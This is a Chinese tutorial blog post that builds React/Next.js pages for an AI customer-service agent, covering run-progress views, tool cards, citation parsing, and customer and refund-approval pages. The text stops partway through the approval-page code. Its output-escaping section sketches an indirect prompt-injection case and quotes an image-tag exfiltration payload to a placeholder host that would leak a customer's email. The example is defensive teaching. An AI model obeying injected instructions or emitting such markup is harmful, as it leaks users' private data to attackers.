---
title: 'Day 470 · 界面(三):过程、工具卡片、回复和引用,两个页面'
description: '把 Day 469 的 RunState 画出来:RunView 显示 Agent 跑过哪些节点和每步的结论,工具卡片把只读查询和要人审批的提交申请分开,回复里的 [1] 渲染成上标链接,模型的输出一律当纯文本。再做客户视角和客服工作台两个页面,用真模型从提交退款、停在审批、客服点通过、客户刷新进展到追问走一遍,合计 0.047 元;最后用 renderToStaticMarkup 证明被注入的 <img> 只会显示成字符。'
pubDate: 2026-10-22
regime: none
tags: ['react', 'nextjs', 'human-in-the-loop', 'xss', 'supportpilot', 'agent-zero']
series: 'agent-zero'
day: 470
lang: 'zh'
draft: true
---

## 上一课回顾

[Day 469](/blog/agent-zero/day-469-ui-stream/) 在浏览器这一侧接住了后端的事件流。`streamEvents` 用 fetch 发 POST,字节经过 TextDecoderStream 和 eventsource-parser 变成类型化的 `AgentEvent`;`run.ts` 里的 reducer 把一次运行的几十到几百个事件折叠成 `RunState`:跑完的节点、每步的细节、工具调用、打字机里的草稿、质检退回次数和原因、审批申请、最终摘要。`useRun` 把它接到 React 上,能停止、能塞一个 GET 拿到的摘要。最后录了一段真流,用回放服务器和调试页在浏览器里不花钱地跑通了。

调试页只是把状态打成 JSON。今天把它画成用户能看的样子,再做两个页面:客户提交工单、看处理过程、追问;客服在工作台审批退款。

## 今天要解决的问题

前端部分默认你会 React 和 Next.js,组件写法、表单、样式都不讲,只讲 Agent 特有的那几样东西怎么呈现。学完今天你应该能做到:

1. 写出 `RunView`:状态和花费、跑过的节点和每步结论、质检退回的原因、工具卡片、审批提示、正文;讲清楚正文为什么有「草稿」和「定稿」两种形态。
2. 写出工具卡片,把只读查询和要人审批的提交申请在视觉上分开,参数折叠起来;讲清楚这个区分只是显示,权限在后端。
3. 把后端拼好的回复拆成正文和参考文章,`[1]` 渲染成上标链接;讲清楚为什么模型的输出一律当纯文本,并用一个被注入的 `<img>` 实测。
4. 做出客户视角和客服工作台两个页面,用真模型走通「提交退款 → 停在审批 → 客服通过 → 客户刷新进展 → 追问」。

预计用时 3 小时。前置:[Day 453](/blog/agent-zero/day-453-tools-registry/)(工具的权限分级)、[Day 460](/blog/agent-zero/day-460-flow-nodes/)(approval 和 finalize 节点)、[Day 467](/blog/agent-zero/day-467-ui-api/)(六个接口)、[Day 469](/blog/agent-zero/day-469-ui-stream/)(包括练习 3 的 `detailText` 和练习 4 的 `rejections`)。

学法:先对照文章逐行敲一遍(不复制粘贴)并跑通;第二天合上文章,把 `RunView` 的结构和 `parseReply` 默写出来;做练习,做不出再展开参考答案,看完关掉自己重写一遍。

## Agent 的界面比聊天框多了什么

普通聊天界面只有两样东西:用户说的话、模型说的话。一个干活的 Agent 至少还要让人看到四样:

<figure>
<svg viewBox="0 0 640 260" role="img" aria-label="RunView 的五块:顶部状态和花费;中间是过程,包括节点和工具卡片;审批提示;最下面是正文,跑的时候是草稿,结束后是带引用的定稿">
<g font-family="var(--font-mono)" font-size="11">
<rect x="20" y="16" width="600" height="230" rx="8" fill="var(--paper-raised)" stroke="var(--rule)"/>
<rect x="36" y="28" width="568" height="28" rx="4" fill="var(--paper)" stroke="var(--rule)"/>
<text x="48" y="46" fill="var(--ink)">① 状态 · 花费 ¥0.0258            (aria-live 只读这一行)</text>
<rect x="36" y="64" width="568" height="28" rx="4" fill="var(--mem-wash)" stroke="var(--mem)"/>
<text x="48" y="82" fill="var(--ink)">② ✓查客户档案 · 找到客户  ✓分诊 · refund  ✓检索 · 3 篇  ✓质检</text>
<rect x="36" y="100" width="275" height="54" rx="4" fill="var(--compute-wash)" stroke="var(--compute)"/>
<text x="48" y="120" fill="var(--ink)">③ 工具卡片</text>
<text x="48" y="140" fill="var(--ink-soft)">查询 ×3 · 提交申请 ×1</text>
<rect x="329" y="100" width="275" height="54" rx="4" fill="var(--compute-wash)" stroke="var(--compute)"/>
<text x="341" y="120" fill="var(--ink)">④ 审批提示</text>
<text x="341" y="140" fill="var(--ink-soft)">RF-…-0002(¥950)已提交</text>
<rect x="36" y="162" width="568" height="70" rx="4" fill="var(--paper)" stroke="var(--rule)"/>
<text x="48" y="182" fill="var(--ink)">⑤ 正文</text>
<text x="48" y="202" fill="var(--ink-soft)">跑的时候:state.draft 打字机,带 [KB-refund-001] 原样</text>
<text x="48" y="220" fill="var(--ink-soft)">结束以后:summary.reply 定稿,[1] 上标 + 参考文章链接</text>
</g>
</svg>
<figcaption>一次运行在界面上分五块。②③④是普通聊天界面没有的,也是 Agent 界面最值钱的部分:用户看得到它查了什么、做了什么、哪一步要人来定。</figcaption>
</figure>

**过程。** 一张退款工单真模型跑 10 秒左右。这 10 秒里什么都不显示,用户会以为卡了;显示一个转圈,用户不知道它在干什么。显示「✓查客户档案 · ✓分诊:退款 · ✓检索到 3 篇」,用户就知道它在按步骤干活,也更容易接受最后的结论。

**工具调用。** Agent 查了哪几个系统、传了什么参数,是客服排查问题时最想看的东西。其中会改业务数据的那一类(SupportPilot 里是提交退款申请)要和只读查询一眼分开。

**审批。** Agent 做到一半停下来等人。界面要告诉客户「已提交、等客服」,并且锁住输入框;要给客服一个地方做决定,决定之后让他看到流程接着跑完。

**引用。** 回复里每一句政策有没有出处,点一下能看到原文,客户才敢信。

这四样里,过程、工具、审批都已经在 `RunState` 里了,今天只是把它们画出来。引用要先把后端拼好的文本拆开。

## 第一步:RunView

`RunView` 只读 `RunState`,不知道数据从哪来:它可以是当前正在跑的那一轮,也可以是历史轮次存下来的最终状态,也可以是审批卡片里恢复后的那一段。

```tsx
// supportpilot/web/src/components/RunView.tsx
// 一次运行的全部界面:状态和花费、步骤、工具卡片、审批提示、正文。只读 RunState,不知道数据从哪来
"use client";
import { STEP_NAMES } from "@/lib/events";
import type { RunState } from "@/lib/run";
import { Reply } from "./Reply";
import { ToolCard } from "./ToolCard";

const STATUS_TEXT: Record<RunState["status"], string> = {
  idle: "",
  running: "处理中",
  waiting_approval: "已提交审批,等客服处理",
  done: "已完成",
  error: "出错了",
  stopped: "已停止接收",
};

function headline(s: RunState): string {
  if (s.status === "done" && s.summary?.outcome === "escalated") return "已转人工客服";
  return STATUS_TEXT[s.status];
}

export function RunView({ state, id, onStop }: { state: RunState; id: string; onStop?: () => void }) {
  if (state.status === "idle") return null;
  const running = state.status === "running";
  const final = state.summary?.reply;

  return (
    <section className="run" aria-busy={running} aria-labelledby={`${id}-status`}>
      <header className="run-head">
        {/* 只把状态变化读给屏幕阅读器听;逐字的 token 不播报 */}
        <h3 id={`${id}-status`} aria-live="polite" className={`badge badge-${state.status}`}>
          {headline(state)}
          {state.summary && ` · 花费 ¥${state.summary.cost_cny}`}
        </h3>
        {running && onStop && (
          <button type="button" className="btn-ghost" onClick={onStop}>停止</button>
        )}
      </header>

      <ol className="steps">
        {state.steps.map((node, i) => (
          <li key={i}>
            <span className="tick" aria-hidden="true">✓</span>
            {STEP_NAMES[node] ?? node}
            {state.details[node] && node !== "check" && <span className="step-detail"> · {state.details[node]}</span>}
          </li>
        ))}
        {running && <li className="pending">…</li>}
      </ol>

      {state.rewrites > 0 && (
        <details className="note">
          <summary>质检退回 {state.rewrites} 次{running && ",正在重写回复"}</summary>
          <ol>{state.rejections.map((ps, i) => <li key={i}>{ps.join(";")}</li>)}</ol>
        </details>
      )}

      {state.tools.length > 0 && (
        <ul className="tools">{state.tools.map((t, i) => <ToolCard key={i} tool={t} />)}</ul>
      )}

      {state.approval && (
        <p className="note note-approval">
          退款申请 {state.approval.request.id}(¥{state.approval.request.amount_cny})已提交审批
          {state.approval.needsFinanceReview && ",金额超过复核线,需要财务复核"}
        </p>
      )}

      {final ? (
        <Reply text={final} id={id} />
      ) : (
        state.draft && (
          <p className={`reply-body ${running ? "typing" : "draft"}`} aria-hidden={running}>
            {!running && <span className="muted">草稿,审批后定稿:</span>}
            {state.draft}
          </p>
        )
      )}

      {state.error && <p className="error" role="alert">{state.error}</p>}
    </section>
  );
}
```

<div class="line-notes">

- `const STATUS_TEXT: Record<RunState["status"], string> = {` `RunState["status"]` 取出那个六选一的类型。用它当 Record 的键,六个状态一个都不能少,漏写一个就编译失败。以后 reducer 加了新状态,这里会先红。
- `function headline(s: RunState): string {` 状态行的文字。Day 469 练习 2 实测过:转人工和已解决在 reducer 里都是 done,区别只在 `summary.outcome`。
- `if (s.status === "done" && s.summary?.outcome === "escalated") return "已转人工客服";` 不加这一行,转人工的工单会显示「已完成」,客户以为问题解决了。
- `export function RunView({ state, id, onStop }` `id` 用来拼 DOM id,一页上有好几个 RunView(历史轮次、当前轮、每张审批卡片),id 不能重复。`onStop?` 可选:历史轮次不传,也就不显示停止按钮。
- `if (state.status === "idle") return null;` 还没开始的运行什么都不画。审批卡片在客服点按钮之前就是 idle。
- `const final = state.summary?.reply;` 有定稿就用定稿。Day 468 之后,没定稿时 reply 一定是 null。
- `<section className="run" aria-busy={running}` 跑的过程中告诉读屏软件「这块还在变」。
- `<h3 id={`${id}-status`} aria-live="polite"` 只有这一行会被读屏软件播报。实测从「处理中」到「已提交审批,等客服处理 · 花费 ¥0.0258」,中间两百多个 token 一个都不播,否则读屏会一个字一个字念个不停。可访问性 Day 471 细讲。
- `{state.summary && ` · 花费 ¥${state.summary.cost_cny}`}` 花费只有 done 之后才知道,跑的过程中不显示。给客户看花费合不合适,是 Day 472 的话题,今天两边都显示。
- `{running && onStop && (` 只有正在跑、而且调用方给了停止函数,才显示停止按钮。
- `{state.steps.map((node, i) => (` 用下标当 key:同一个节点可能出现两次(质检退回时 draft 和 check 再来一遍),节点名不唯一。列表只会在末尾追加,用下标没问题。
- `{STEP_NAMES[node] ?? node}` 不认识的节点名原样显示。
- `{state.details[node] && node !== "check" &&` 每步后面挂一句结论。check 不挂:退回原因可能很长(Day 469 实测一次四句话),放到下面的折叠块里。
- `{running && <li className="pending">…</li>}` 跑的时候末尾挂一个省略号,表示后面还有。
- `<details className="note">` 用原生的 `<details>` 折叠退回原因,默认只显示一行「质检退回 2 次」,客服想看再点开。
- `<summary>质检退回 {state.rewrites} 次{running && ",正在重写回复"}</summary>` running 是 false 时,`{false}` 在 React 里什么都不渲染。跑完了就别再说「正在重写」。
- `<ol>{state.rejections.map((ps, i) => <li key={i}>{ps.join(";")}</li>)}</ol>` Day 469 练习 4 加的 rejections,每次退回一项。
- `{state.tools.length > 0 && (` 没调工具的工单(纯政策问答)不显示这一块。
- `退款申请 {state.approval.request.id}(¥{state.approval.request.amount_cny})已提交审批` 只取 id 和金额。Day 469 调试页里看到过,request 里还有一个写给模型看的 note,不能显示出来。
- `{state.approval.needsFinanceReview && ",金额超过复核线,需要财务复核"}` 后端算好的,前端不自己比 1000。
- `{final ? (` 有定稿显示定稿(带引用),没有就显示打字机里的草稿。
- `<p className={`reply-body ${running ? "typing" : "draft"}`} aria-hidden={running}>` 跑的时候打字机,末尾有一个闪烁的光标;对读屏软件隐藏,等它停下来再读。
- `{!running && <span className="muted">草稿,审批后定稿:</span>}` 停在审批时还没有定稿,标清楚这是草稿,免得客户以为这就是最终答复。
- `{state.error && <p className="error" role="alert">{state.error}</p>}` `role="alert"` 的内容一出现就会被播报。

</div>

正文为什么有两种形态?打字机里的 `draft` 是 draft 节点逐字推出来的模型原文,引用是 `[KB-refund-001]` 这种文章编号;定稿是 finalize 节点调 `render_sources()`(Day 451)拼好的:编号换成 `[1]`,文末附参考文章,审批通过后还有一句「补充」。两者不只是格式不同,内容也可能不同:质检退回过的话,第一版草稿早被清掉了。所以收到 done 以后,一律换成 `summary.reply`,不要拿 draft 当最终回复。

## 第二步:工具卡片

```tsx
// supportpilot/web/src/components/ToolCard.tsx
import type { ToolEvent } from "@/lib/events";

// Day 453 工具分级里 PROPOSE 级的工具:会在业务库里留下一条要人审批的记录。
// 这里只决定显示样式,真正的权限在后端,前端改这一行也调不了不该调的工具
const PROPOSE = new Set(["create_refund_request"]);

// 参数是模型给的 JSON 字符串:能解析就排版,解析不了(模型偶尔给坏 JSON)就原样显示
function pretty(args: string): string {
  try {
    return JSON.stringify(JSON.parse(args), null, 2);
  } catch {
    return args;
  }
}

export function ToolCard({ tool }: { tool: ToolEvent }) {
  const propose = PROPOSE.has(tool.name);
  const cls = ["tool", propose && "tool-propose", tool.error && "tool-error"].filter(Boolean).join(" ");
  return (
    <li className={cls}>
      <div className="tool-head">
        <code>{tool.name}</code>
        <span className="tool-tag">{tool.error ? "出错" : propose ? "提交申请 · 要人审批" : "查询"}</span>
      </div>
      <details>
        <summary>参数</summary>
        <pre>{pretty(tool.args)}</pre>
      </details>
      {tool.error && <p className="tool-err">工具返回了错误,Agent 会看到错误信息再决定下一步</p>}
    </li>
  );
}
```

<div class="line-notes">

- `const PROPOSE = new Set(["create_refund_request"]);` Day 453 把工具分成 READ 和 PROPOSE 两级,直接动钱的 decide_refund 根本不注册。PROPOSE 只有 create_refund_request 一个。它不直接退钱,但会在 `biz.refund_requests` 里写一条 pending 记录,要人批。
- `function pretty(args: string): string {` args 是字符串(Day 469 的类型),先解析再排版。
- `return JSON.stringify(JSON.parse(args), null, 2);` 第三个参数 2 是缩进两格。实测 `{"customer_id": "C0002", "limit": 10}` 变成三行。
- `} catch {` catch 后面不写变量是 ES2019 起的写法,用不到错误对象就不声明。
- `return args;` 模型偶尔会给不完整的 JSON,解析失败就原样显示,不让整张卡片崩掉。练习 3 实测。
- `const cls = ["tool", propose && "tool-propose", tool.error && "tool-error"].filter(Boolean).join(" ");` 条件拼 class 的常见写法:不满足的项是 false,`filter(Boolean)` 去掉再拼。实测查询卡片的 class 是 `tool`,提交申请的是 `tool tool-propose`。
- `<span className="tool-tag">{tool.error ? "出错" : propose ? "提交申请 · 要人审批" : "查询"}</span>` 实测四张卡片的标签依次是 查询、查询、查询、提交申请 · 要人审批。
- `<details>` 参数默认折叠。客服排查时点开看,客户不会被一屏 JSON 吓到。
- `<pre>{pretty(tool.args)}</pre>` 如果这里写成 `JSON.stringify(tool.args, null, 2)`,就是对一个字符串再编码一次,参数框里会显示 `"{\"customer_id\": \"C0002\"}"`,外面一圈引号、里面全是反斜杠。
- `{tool.error && <p className="tool-err">` error 是布尔值。写成 `{tool.error}` 想显示错误文字的话,React 遇到 true 什么都不渲染,出错的卡片下面会是空的。具体的错误文字在后端的 tool_log 里,不推给前端。

</div>

提交申请那张卡片用了另一种底色(样式在第五步)。我考虑过给它一个更吓人的标签「写操作」,最后用了「提交申请 · 要人审批」:它确实写了库,但写的是一条申请,钱没动。标签要说清楚它的真实后果,太轻了用户不当回事,太重了用户会以为钱已经退了。

`PROPOSE` 这个集合只决定显示。有人看到前端有个工具名单,会以为这就是权限控制。不是:模型能调哪些工具,是后端 `openai_tools({Level.READ, Level.PROPOSE})` 决定的,前端改了这一行,后端照样不会多给模型一个工具;真正动钱的 `decide_refund` 根本没注册成工具,模型连名字都看不到(Day 453)。**前端永远不是安全边界。**

## 第三步:回复和引用

后端 `render_sources()` 输出的是一段纯文本,正文里是 `[1]`,末尾一段「参考文章:」,每行「[n] 标题 链接」;审批通过的那次,approval 节点还会在最后追加一句「补充:……」(Day 460)。实测审批后的定稿长这样:

```text
您好，您的专业版年付订单在首次购买后 14 天内，符合无理由全额退款条件 [1]。我们已为您提交退款申请（单号 RF-T000153-INV-202609-0002，金额 950 元），审核通过后会原路退回。审核进度会另行通知，请您留意。

参考文章:
[1] 退款政策总览 https://help.cloudledger.example/help/refund/001

补充:您的退款申请已审核通过,950.00 元将原路退回,到账时间以支付渠道为准。
```

前端把它拆成结构化数据:

```ts
// supportpilot/web/src/lib/reply.ts
// 后端 render_sources() 的输出:正文里是 [1] [2],末尾一段「参考文章:」,每行 "[n] 标题 链接";
// 审批通过后 approval 节点还会在最后追加一句「补充:……」。这里拆成结构化数据,前端自己渲染。

export type Source = { n: number; title: string; url: string };
export type ParsedReply = { body: string; sources: Source[] };

const FOOTER = "\n\n参考文章:\n";
const LINE = /^\[(\d+)\]\s+(.+?)\s+(https?:\/\/\S+)$/;

export function parseReply(reply: string): ParsedReply {
  const at = reply.indexOf(FOOTER);
  if (at < 0) return { body: reply, sources: [] };
  const sources: Source[] = [];
  const tail: string[] = [];
  for (const line of reply.slice(at + FOOTER.length).split("\n")) {
    const m = LINE.exec(line.trim());
    if (m) sources.push({ n: Number(m[1]), title: m[2], url: m[3] });
    else if (line.trim()) tail.push(line); // 「补充:…」在参考文章后面,挪回正文
  }
  return { body: reply.slice(0, at) + (tail.length ? "\n\n" + tail.join("\n") : ""), sources };
}

// 把正文切成文字段和引用编号,方便把编号渲染成上标链接
export function splitCitations(body: string): (string | number)[] {
  return body.split(/\[(\d+)\]/).map((part, i) => (i % 2 === 1 ? Number(part) : part));
}
```

<div class="line-notes">

- `const FOOTER = "\n\n参考文章:\n";` 和后端 `render_sources()` 拼的格式一字不差,包括半角冒号。前后端约定一个分隔符,任何一边改了另一边都要跟着改。
- `const LINE = /^\[(\d+)\]\s+(.+?)\s+(https?:\/\/\S+)$/;` 三个捕获组:编号、标题、链接。`(.+?)` 非贪婪,配合后面的 `\s+(https?...)$`,标题里有空格(「年付超过 14 天怎么退」)也能切对。只认 http 和 https 开头的链接。
- `if (at < 0) return { body: reply, sources: [] };` 没有参考文章的回复原样返回。转人工那句固定回复就走这里。
- `for (const line of reply.slice(at + FOOTER.length).split("\n")) {` 实测上面那段定稿切出四行:一行参考文章、一个空行、一行「补充」……
- `if (m) sources.push({ n: Number(m[1]), title: m[2], url: m[3] });` 实测 sources 是 `[{n: 1, title: "退款政策总览", url: ".../refund/001"}]`。
- `else if (line.trim()) tail.push(line);` 不是参考文章、又不是空行的,就是「补充」那句,先收着。
- `return { body: reply.slice(0, at) + (tail.length ? "\n\n" + tail.join("\n") : ""), sources };` 把「补充」挪回正文末尾,参考文章单独放。
- `return body.split(/\[(\d+)\]/).map((part, i) => (i % 2 === 1 ? Number(part) : part));` split 用的正则里有捕获组时,捕获到的内容也会留在结果数组里。`"a [1] b [2] c"` 切成 `["a ", "1", " b ", "2", " c"]`,奇数下标正好是编号。

</div>

```tsx
// supportpilot/web/src/components/Reply.tsx
// 模型的输出一律当纯文本:不用 dangerouslySetInnerHTML,不用 Markdown 渲染库。只有我们自己解析出来的链接渲染成 <a>
import { parseReply, splitCitations } from "@/lib/reply";

export function Reply({ text, id }: { text: string; id: string }) {
  const { body, sources } = parseReply(text);
  return (
    <div className="reply">
      <p className="reply-body">
        {splitCitations(body).map((part, i) =>
          typeof part === "number" ? (
            <sup key={i}>
              <a href={`#${id}-ref-${part}`} aria-label={`参考文章 ${part}`}>[{part}]</a>
            </sup>
          ) : (
            <span key={i}>{part}</span>
          ),
        )}
      </p>
      {sources.length > 0 && (
        <ol className="sources" aria-label="参考文章">
          {sources.map((s) => (
            <li key={s.n} id={`${id}-ref-${s.n}`} value={s.n}>
              <a href={s.url} target="_blank" rel="noopener noreferrer">{s.title}</a>
            </li>
          ))}
        </ol>
      )}
    </div>
  );
}
```

<div class="line-notes">

- `const { body, sources } = parseReply(text);` 先拆成正文和参考文章。
- `typeof part === "number" ? (` splitCitations 返回的数组里,数字是引用编号,字符串是正文。
- `<a href={`#${id}-ref-${part}`} aria-label={`参考文章 ${part}`}>[{part}]</a>` 点了跳到下面对应的参考文章。实测工作台审批卡片里的链接是 `#run-RF-T000153-INV-202609-0002-ref-1`,前缀来自卡片传进来的 id,一页上几张卡片不会互相跳错。`aria-label` 让读屏软件念「参考文章 1」而不是「左方括号 1 右方括号」。
- `<span key={i}>{part}</span>` 正文走文本节点,React 自动转义。模型吐出 `<img ...>`,页面上只会显示这几个字符。
- `<li key={s.n} id={`${id}-ref-${s.n}`} value={s.n}>` `value` 让有序列表的序号和正文里的 [n] 对上,哪怕编号不是从 1 连续开始。
- `<a href={s.url} target="_blank" rel="noopener noreferrer">{s.title}</a>` 新标签页打开。`noopener` 让新页面拿不到 `window.opener`,改不了我们这个页面;`noreferrer` 不把我们的页面地址发过去。实测链接是 `https://help.cloudledger.example/help/refund/001`,rel 是 `noopener noreferrer`。

</div>

这里有一条原则:**模型的输出永远当纯文本处理。** 不用 `dangerouslySetInnerHTML`,也不引 Markdown 渲染库把它直接转成 HTML。[Day 403](/blog/agent-zero/day-403-injection-1/) 讲过间接注入:模型读的帮助中心文章、客户工单正文,都可能夹着攻击者写的指令,模型照做以后,回复里就可能出现一个 `<img src="https://evil.invalid/?q=客户邮箱">`。浏览器一渲染,不用任何人点击,图片请求就把数据发到了别人的服务器。用 Markdown 渲染库也一样,`![](https://evil.invalid/...)` 会被渲染成图片。练习 1 会实测。

我们的链接只有一种来源:后端 `render_sources()` 用检索结果里的文章标题和路径拼出来的,不是模型直接写的。模型只能写 `[KB-refund-001]` 这种编号,编号不在这次检索结果里就被 check 节点拦下(Day 460 的 `check_citations`),在的话由后端换成真链接。这也是为什么引用要后端拼、前端只认固定格式。

## 第四步:两个页面

布局加一个顶部导航。Day 469 的调试页挪到 `/debug`,把 `src/app/page.tsx` 移到 `src/app/debug/page.tsx`,文件开头的注释路径改一下,外层的 `<main>` 换成 `<div className="page">`(layout 里已经有一个 main 了,一页里不该有两个):

```bash
mkdir -p src/app/debug src/app/desk src/components
mv src/app/page.tsx src/app/debug/page.tsx
```

```tsx
// supportpilot/web/src/app/layout.tsx
import type { Metadata } from "next";
import Link from "next/link";
import "./globals.css";

export const metadata: Metadata = { title: "SupportPilot", description: "CloudLedger 智能客服演示" };

export default function RootLayout({ children }: LayoutProps<"/">) {
  return (
    <html lang="zh-CN">
      <body>
        <nav className="topnav" aria-label="主导航">
          <strong>SupportPilot</strong>
          <Link href="/">客户视角</Link>
          <Link href="/desk">客服工作台</Link>
          <Link href="/debug">调试页</Link>
        </nav>
        <main>{children}</main>
      </body>
    </html>
  );
}
```

<div class="line-notes">

- `export const metadata: Metadata = {` 只有服务端组件能导出 metadata,所以 layout 不写 "use client"。
- `<nav className="topnav" aria-label="主导航">` 页面上不止一个 nav 时,读屏靠 aria-label 区分。
- `<Link href="/debug">调试页</Link>` 演示项目留着调试页,排查时很方便。上线前要么删掉,要么加访问控制(Day 490)。

</div>

### 客户视角

```tsx
// supportpilot/web/src/app/page.tsx  客户视角:提交工单、看过程、追问
"use client";
import { useState } from "react";
import { RunView } from "@/components/RunView";
import { createTicket, followUp, getTicket, runTicket } from "@/lib/api";
import type { RunState } from "@/lib/run";
import { ApiError } from "@/lib/sse";
import { useRun } from "@/lib/useRun";

const DEMO_EMAILS = ["lina@example.com", "wugang@example.com", "wangfang@example.com", "nobody@example.com"];

type Turn = { role: "customer"; text: string } | { role: "agent"; key: string };

export default function CustomerPage() {
  const [ticketId, setTicketId] = useState<string | null>(null);
  const [turns, setTurns] = useState<Turn[]>([]);
  const [history, setHistory] = useState<Record<string, RunState>>({});
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [msg, setMsg] = useState("");
  const { state, start, stop, apply } = useRun();
  const busy = state.status === "running";
  const locked = busy || state.status === "waiting_approval";

  function archiveCurrent() {
    if (state.status === "idle") return;
    const key = `t${turns.length}`;
    setHistory((h) => ({ ...h, [key]: state }));
    setTurns((t) => [...t, { role: "agent", key }]);
  }

  async function submit(form: FormData) {
    setSubmitError(null);
    try {
      const { ticket_id } = await createTicket({
        customer_email: String(form.get("email")),
        subject: String(form.get("subject")),
        body: String(form.get("body")),
      });
      setTicketId(ticket_id);
      setTurns([]);
      setHistory({});
      start((signal) => runTicket(ticket_id, signal));
    } catch (e) {
      setSubmitError(e instanceof ApiError ? e.message : "提交失败,请检查后端是否启动");
    }
  }

  function ask(e: React.FormEvent) {
    e.preventDefault();
    if (!ticketId || !msg.trim()) return;
    archiveCurrent();
    setTurns((t) => [...t, { role: "customer", text: msg }]);
    const content = msg;
    setMsg("");
    start((signal) => followUp(ticketId, content, signal));
  }

  return (
    <div className="page">
      <h1>提交工单</h1>
      {!ticketId && (
        <form action={submit} className="ticket-form">
          <label>
            发件邮箱(演示数据)
            <select name="email" defaultValue={DEMO_EMAILS[0]}>
              {DEMO_EMAILS.map((m) => <option key={m}>{m}</option>)}
            </select>
          </label>
          <label>
            主题
            <input name="subject" defaultValue="想退款" maxLength={200} required />
          </label>
          <label>
            问题描述
            <textarea name="body" rows={4} maxLength={4000} required defaultValue="上周买的专业版年付,用不上,请帮我退款。" />
          </label>
          <button type="submit">提交工单</button>
          {submitError && <p className="error" role="alert">{submitError}</p>}
        </form>
      )}

      {ticketId && (
        <>
          <p className="muted">工单号 {ticketId}</p>
          {turns.map((t, i) =>
            t.role === "customer" ? <p key={i} className="bubble">{t.text}</p> : <RunView key={i} state={history[t.key]} id={t.key} />,
          )}
          <RunView state={state} id="current" onStop={stop} />
          <form onSubmit={ask} className="ask">
            <label htmlFor="ask" className="sr-only">继续追问</label>
            <input id="ask" value={msg} onChange={(e) => setMsg(e.target.value)} placeholder={`在工单 ${ticketId} 里继续追问`}
              maxLength={4000} disabled={locked} />
            <button type="submit" disabled={locked || !msg.trim()}>发送</button>
          </form>
          {state.status === "waiting_approval" && (
            <p className="muted">
              退款在等客服审批,审批完成后可以继续追问。{" "}
              <button type="button" className="link" onClick={async () => apply({ event: "done", data: await getTicket(ticketId) })}>
                刷新进展
              </button>
            </p>
          )}
        </>
      )}
    </div>
  );
}
```

<div class="line-notes">

- `const DEMO_EMAILS = [` 种子数据里的客户邮箱:李娜 C0002、吴刚 C0010(VIP)、王芳 C0003。`nobody@example.com` 是故意不存在的,用来看「没找到这个邮箱对应的客户」那条路。
- `type Turn = { role: "customer"; text: string } | { role: "agent"; key: string };` 客户说的话直接存文字;Agent 那一轮只存一个 key,真正的状态在 history 里。
- `const [history, setHistory] = useState<Record<string, RunState>>({});` 历史轮次只保存最终状态,当前这一轮用 useRun 的实时状态。
- `const locked = busy || state.status === "waiting_approval";` 正在跑、或者停在审批,输入框都锁住。停在审批时不锁的话,客户发了追问会撞上后端的 409,虽然也会显示 409 那句中文,但能在前面挡住就别让用户撞上去。
- `function archiveCurrent() {` 追问之前,先把当前这一轮存进历史。
- `const key = `t${turns.length}`;` 第一次追问时 turns 是空的,key 是 "t0"。
- `setHistory((h) => ({ ...h, [key]: state }));` 函数式更新:参数 h 一定是最新的 history,连续调用也不会丢。
- `async function submit(form: FormData) {` React 19 的 form action:`<form action={submit}>` 直接传函数,React 把 FormData 交给它,不用自己 preventDefault。
- `customer_email: String(form.get("email")),` `form.get` 返回 `FormDataEntryValue | null`,用 `String()` 统一转成字符串。
- `start((signal) => runTicket(ticket_id, signal));` 不 await:流在后台跑,submit 立刻返回。实测点提交后 0.23 秒状态行就是「处理中」。
- `setSubmitError(e instanceof ApiError ? e.message : "提交失败,请检查后端是否启动");` 后端没起时 fetch 抛的是 TypeError,走后半句。
- `const content = msg;` 先存一份再清空输入框,意图更清楚:发出去的就是清空之前的那一句。
- `{turns.map((t, i) =>` 历史按顺序画:客户的气泡、那一轮 Agent 的 RunView。
- `<RunView key={i} state={history[t.key]} id={t.key} />` 历史轮次不传 onStop。
- `<RunView state={state} id="current" onStop={stop} />` 当前这一轮,状态行的 id 是 `current-status`。
- `<label htmlFor="ask" className="sr-only">继续追问</label>` 看不见但读屏软件读得到的标签。只有 placeholder 不算标签。
- `maxLength={4000} disabled={locked} />` 和后端 `Message` 的 `max_length=4000` 一致(Day 467)。前端拦住只是体验,后端那道才算数。
- `onClick={async () => apply({ event: "done", data: await getTicket(ticketId) })}>` Day 469 练习 2:GET 返回的摘要和 done 事件形状一样,直接当 done 喂进 reducer。

</div>

客户这边的审批交互是:停在审批时,状态行说「已提交审批,等客服处理」,正文显示标着「草稿,审批后定稿」的草稿,输入框锁住,下面一行说明原因并给一个「刷新进展」。刷新是手动的,做成每 5 秒轮询一次也可以,演示项目手动更直观;生产上更好的做法是客户页面也订阅一个事件通道,审批完成时后端主动推。

### 客服工作台

```tsx
// supportpilot/web/src/app/desk/page.tsx  客服工作台:待审批列表,一键通过/驳回,恢复后的流程在卡片里跑完
"use client";
import { useCallback, useEffect, useState } from "react";
import { RunView } from "@/components/RunView";
import { decide, listApprovals, type PendingRefund } from "@/lib/api";
import { useRun } from "@/lib/useRun";

const FINANCE_REVIEW_LINE = 1000; // 和后端 settings.refund_review_threshold 一致,只用来提示,真正的判断在后端

function ApprovalCard({ r }: { r: PendingRefund }) {
  const [note, setNote] = useState("");
  const { state, start } = useRun();
  const decided = state.status !== "idle";

  function go(approved: boolean) {
    start((signal) => decide(r.ticket_id, { approved, approver: "demo-finance", note }, signal));
  }

  return (
    <article className="card" aria-labelledby={`h-${r.id}`}>
      <h2 id={`h-${r.id}`}>{r.id} · {r.customer_name} · ¥{r.amount_cny}</h2>
      <p className="muted">工单 {r.ticket_id} · 规则 <code>{r.rule}</code> · 原因:{r.reason}</p>
      {r.amount_cny > FINANCE_REVIEW_LINE && <p className="warn">金额超过 {FINANCE_REVIEW_LINE} 元,按政策需要财务复核</p>}
      {!decided && (
        <div className="decide">
          <label>
            审批备注
            <input value={note} onChange={(e) => setNote(e.target.value)} placeholder="驳回时建议写原因,会发给客户" />
          </label>
          <button type="button" onClick={() => go(true)}>通过</button>
          <button type="button" className="btn-danger" onClick={() => go(false)}>驳回</button>
        </div>
      )}
      <RunView state={state} id={`run-${r.id}`} />
    </article>
  );
}

export default function DeskPage() {
  const [items, setItems] = useState<PendingRefund[] | null>(null);
  const [error, setError] = useState<string | null>(null);

  const load = useCallback(() => {
    setError(null);
    listApprovals().then(setItems, () => setError("拉取待审批列表失败,请检查后端是否启动"));
  }, []);
  useEffect(load, [load]);

  return (
    <div className="page">
      <h1>待审批退款 <button type="button" className="link" onClick={load}>刷新</button></h1>
      {error && <p className="error" role="alert">{error}</p>}
      {items === null && !error && <p className="muted">加载中…</p>}
